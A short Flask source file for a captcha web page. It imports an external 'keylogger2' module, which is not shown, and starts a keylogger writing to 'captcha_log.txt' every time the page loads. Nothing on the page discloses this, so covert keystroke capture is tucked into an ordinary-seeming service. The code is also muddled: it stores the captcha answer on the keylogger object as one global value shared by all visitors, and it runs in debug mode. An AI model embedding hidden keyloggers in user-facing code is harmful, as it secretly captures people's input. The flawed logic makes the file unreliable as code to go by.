from flask import Flask, render_template, request, redirect, url_for
import string
import random
import keylogger2
import os

app = Flask(__name__)

# Create a new captcha keylogger instance
captcha_keylogger = keylogger2.Keylogger('captcha_log.txt')

def generate_random_chars(num_chars):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(num_chars))

@app.route('/', methods=['GET', 'POST'])
def captcha():
    if request.method == 'POST':
        # Check if the user's captcha input is correct
        user_input = request.form['captcha'].upper()
        if user_input == captcha_keylogger.current_word:
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    else:
        captcha_keylogger.start()
        chars = generate_random_chars(5)
        captcha_keylogger.current_word = chars
        return render_template('captcha.html', captcha=chars)

@app.route('/success')
def success():
    captcha_keylogger.stop()
    return 'Success!'

@app.route('/failure')
def failure():
    captcha_keylogger.stop()
    return 'Failure!'

if __name__ == '__main__':
    if os.path.exists('captcha_log.txt'):
        os.remove('captcha_log.txt')
    app.run(debug=True)